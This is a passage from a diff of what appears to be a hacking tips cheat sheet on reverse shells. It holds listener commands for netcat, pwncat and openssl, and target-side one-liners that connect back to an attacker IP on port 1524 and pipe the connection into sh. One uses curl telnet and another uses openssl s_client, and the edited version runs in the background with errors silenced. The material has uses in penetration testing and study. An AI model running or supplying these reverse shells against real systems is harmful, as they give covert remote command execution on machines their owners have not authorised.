@@ -1258,8 +1258,8 @@ nc -nvlp 1524
 After connection, [upgrade](#reverse-shell-interactive) your shell to a fully interactive PTY shell. Alternatively use [pwncat-cs](https://pwncat.org/) instead of netcat:
 ```sh
 pwncat -lp 1524
-# Press "Ctrl-C" if pwncat gets stuck after "registerd new host ...".
-# Then type "back" to get the prompt off the remote shell.
+# Press "Ctrl-C" if pwncat gets stuck at "registerd new host ...".
+# Then type "back" to get the prompt of the remote shell.
 ```
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
@@ -1309,10 +1309,13 @@ C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/nul
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
 # Start your listening server:
 openssl s_server -port 1524 -cert cert.pem -key key.pem
+# Or pwncat:
+# pwncat -lp 1524 --ssl
 ```
+
 ```sh
-# On the target:
-{ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
+# On the target, start an openssl reverse shell as background process:
+({ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- 2>/dev/null | sh 2>&3 >&3 3>&- ; } 3>&1 | : & )
 ```
 
 <a id="reverse-shell-no-bash"></a>
